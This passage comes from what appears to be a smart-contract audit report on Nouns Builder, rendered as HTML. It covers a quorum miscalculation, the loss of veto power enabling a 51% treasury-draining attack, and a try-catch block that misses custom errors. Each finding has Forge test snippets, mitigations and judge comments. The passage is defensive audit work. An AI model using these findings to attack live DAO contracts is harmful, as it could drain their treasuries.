class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;---------&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">).</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Everybody cast a `for` vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">castVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">castVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">castVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;The amount of votes necessary for this proposal to pass is:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">).</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;The amount of for votes in the proposal:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">).</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Proposal still doesn&#39;t pass</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">((</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">).</span><span class=\"mtk12\">voteEnd</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PROPOSAL_UNSUCCESSFUL()&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">queue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Forge</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Either one of this 2 options is viable:</p>\n<ol>\n<li>Decrease <code>token.totalSupply()</code> whenever a token gets burned. This might not be expected behaviour from the point of view of external protocols.</li>\n<li>Adjust the calculations in <code>proposal.quorum()</code> and <code>governor.proposalThreshold()</code> in such a way that they take into account the burned tokens and the tokens currently held by the auction contract.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423#issuecomment-1257290133\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The system is using totalSupply as a way to determine quorum.</p>\n<p>Because the system is adapted to not look at totalSupply at a certain block, I assume the Sponsor removed the code to reduce totalSupply.</p>\n<p>However this can cause issues, such as the inability to reach quorum, or quorum being too high compared to circulatingSupply.</p>\n<p>I believe that mitigation for this issue is not straightforward, as to allow dynamic totalSupply changes, checkpoints for total supply should be brought back as well.</p>\n<p>From checking NounsDAO code, they handle this by using a list for the totalSupply and popping an entry out of it:\n<a href=\"https://etherscan.io/address/0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03#code#F11#L183\">https://etherscan.io/address/0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03#code#F11#L183</a></p>\n<p>Meaning that totalSupply does change in what is the reference implementation for this codebase.</p>\n<p>Given the above, I believe the finding to be valid and of Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-11-loss-of-veto-power-can-lead-to-51-attack\" style=\"position:relative;\"><a href=\"#m-11-loss-of-veto-power-can-lead-to-51-attack\" aria-label=\"m 11 loss of veto power can lead to 51 attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533\">[M-11] Loss of Veto Power can Lead to 51% Attack</a></h2>\n<p><em>Submitted by TomJ, also found by 0xSky, ayeslick, Chom, pedr02b2, PwnPatrol, yixxas, and zkhorse</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L76\">Governor.sol#L76</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L596-L602\">Governor.sol#L596-L602</a><br></p>\n<p>The veto power is important functionality for current Nouns DAO logic in order to protect their treasury from malicious proposals.\nHowever there is lack of zero address check and lack of 2 step address changing process for vetoer address.<br>\nThis might lead to DAO owner losing their veto power unintentionally and open to 51% attack which can drain their entire treasury.</p>\n<p><a href=\"https://dialectic.ch/editorial/nouns-governance-attack\">https://dialectic.ch/editorial/nouns-governance-attack</a><br>\n<a href=\"https://dialectic.ch/editorial/nouns-governance-attack-2\">https://dialectic.ch/editorial/nouns-governance-attack-2</a></p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Lack of 0-address check for vetoer address at initialize() of Governor.sol<br>\nAlso I recommend to make changing address process of vetoer at updateVetoer() into 2-step process to avoid accidently setting\nvetoer to arbitrary address and end up lossing veto power unintentionally.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Governor.sol:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">57:    function initialize(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">76:        settings.vetoer = _vetoer;</span></span></code></pre>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">596:    function updateVetoer(address _newVetoer) external onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">597:        if (_newVetoer == address(0)) revert ADDRESS_ZERO();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">599:        emit VetoerUpdated(settings.vetoer, _newVetoer);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">601:        settings.vetoer = _newVetoer;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">602:    }</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add zero address check for vetoer address at initialize().<br>\nChange updateVetoer() vetoer address changing process to 2-step process like explained below.</p>\n<p>First make the updateVetoer() function approve a new vetoer address as a pending vetoer.<br>\nNext that pending vetoer has to claim the ownership in a separate transaction to be a new vetoer.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1257297522\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Given the informations that we have, the settings that are available and the <a href=\"https://dialectic.ch/editorial/nouns-governance-attack-2\">historical context</a>, considering that the contract can allow burning the Vetoer, the Warden has demonstrated a risk that applies to all DAOs built via the factory, as well as other Governance Processes which share those traits.</p>\n<p>Because this exploit is contingent on external factors, I think Medium Severity to be appropriate.</p>\n<p>I personally believe that a Vetoer is a challenge toward a decentralized governance process, however I must agree with the evidence that a 51% attack is possible and has been exploited in the past via code similar to that which is in scope.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533\">tbtstl (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1261738906\">kulkarohan (Nouns Builder) commented</a>:</strong></p>\n<blockquote>\n<p>The zero-address check is done in <code>Manager.deploy()</code> — see the following lines:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L117\">Manager.sol#L117</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L139\">Manager.sol#L139</a></p>\n<p>I agree however that the vetoer should be set in 2-steps instead of directly.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1265987401\">kulkarohan (Nouns Builder) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Believe this is QA IMO.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/533#issuecomment-1272568232\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Agree with the sponsor that 2 step checks are QA.</p>\n<p>However, am choosing to keep the report as Med for the 51% attack part.</p>\n<p>Historically this has been exploited and can create a dramatic impact.</p>\n<p>My specific reasoning is that a 51% attack can happen, exclusively if Vetoer is removed, apathetic or malicious.</p>\n<p>This guiding principle has opened up, for this specific contest, a set of decision that inherently create some attrition between me and the sponsor, specifically: this report, as well as <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479\">#479</a> and <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622\">#622</a>.</p>\n<p>My reasoning is that all of these findings are logically equivalent.</p>\n<ul>\n<li>There’s a risk of brute forcing the system</li>\n<li>To avoid the brute force we have a trusted third party</li>\n<li>The trusted third party creates a new set of complications</li>\n</ul>\n<p>I can only empathize with the Sponsor in that the system does what it’s supposed to do, which is being a factory of Nouns DAO, at the same time, because of our rules, and the historical context of previous judging, Admin Privilege is a valid Medium Severity finding (as highlighted by other reports in this same contest and others).</p>\n<p>Unfortunately Admin privilege in the case of governance falls onto the Vetoer, the one entity that is necessary to avoid a riskier (potentially) situation of a 51% attack. 51% voting power can be reached by bribing any time it’s economically feasible.</p>\n<p>It is indeed circular logic, which to me reflects the current state of onChain governance. Which means I don’t have a clear mitigation.</p>\n<p>For those reasons I can agree to disagree with the Sponsor and also recommend a nofix as at this time, with the given architecture, we either have a risk of Malicious Governance, Bribeable Voters, or risk of Malicious Vetoer.</p>\n<p>When we talk about “Smart Contract” risk today, we can talk about Qualitative Risks and Quantitative Risks, the idea that a Vetoer could be malicious seems to fall into a Qualitative Risk, due to the bleeding-edge state of the tech and industry, I believe every person using the system is aware of those risks, however the acknowledgement of those risks doesn’t make it disappear.</p>\n<p>This report and the two linked below also show a limitation of our current rules as well as the need to clarify what is “acceptable” Admin Privilege vs what is not.</p>\n<p>Because of the context detailed above, I believe that I must judge those 3 findings equivalently, and while an argument for downgrading them to QA is legitimate, I believe that the correct severity, consistent over the organization’s lifetime (over 1 year and a half) is Medium Severity.</p>\n<p>I understand other Auditors and projects offer a different rating (see Consensys Medium for Flagging staff up, vs our Medium which means Loss of Funds Conditional on External Conditions)</p>\n<p>And I believe these findings will have to be discussed within the org to decide if Medium severity is appropriate.<br>\nI’ll be flagging these findings up to discuss them with the broader community and discuss whether it is correct or appropriate for C4 to judge findings that ultimately “protect the end user” while they create attrition with the Sponsor.</p>\n<p>While we have those discussions, at this time, C4 has prided itself in calling out unspoken risks that are inherent with a specific system (Smart Contract Risk), and in the case of the governor, as detailed by this report, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479\">#479</a> and <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/622\">#622</a> there’s an inherent risk which we made our best effort to quantify, and hopefully in talking about instead of taking it for granted, as a industry, we can find a way to build software that addresses these concerns.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-try-catch-block-at-auction_createauction-will-only-catch-string-errors\" style=\"position:relative;\"><a href=\"#m-12-try-catch-block-at-auction_createauction-will-only-catch-string-errors\" aria-label=\"m 12 try catch block at auction_createauction will only catch string errors permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240\">[M-12] Try-catch block at <code>Auction._createAuction()</code> will only catch string errors</a></h2>\n<p><em>Submitted by 0xA5DF</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L234\">Auction.sol#L234</a><br></p>\n<p>The <code>_createAuction</code> function wraps the <code>token.mint()</code> call in a try-catch block, however this will only catch reverts that comes from the require keyword and not the reverts with custom errors or other kinds of errors (arithmetic over/underflow etc.)</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>In case of an error at the <code>mint()</code> function the auction won’t be settled till the owner intervenes and pauses the contract.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here’s a test that proves that <code>catch Error()</code> doesn’t catch custom errors (the test will fail):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: UNLICENSED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ContractTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testErr</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Reverter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">r</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Reverter</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk12\">r</span><span class=\"mtk1\">.</span><span class=\"mtk11\">throwCustomError</span><span class=\"mtk1\">(){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Error</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Reverter</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">error</span><span class=\"mtk1\">  </span><span class=\"mtk11\">MyErr</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">throwCustomError</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MyErr</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the <code>Error</code> so that it’ll catch any kind of revert:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Pause the contract if token minting failed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        } catch Error(string memory) 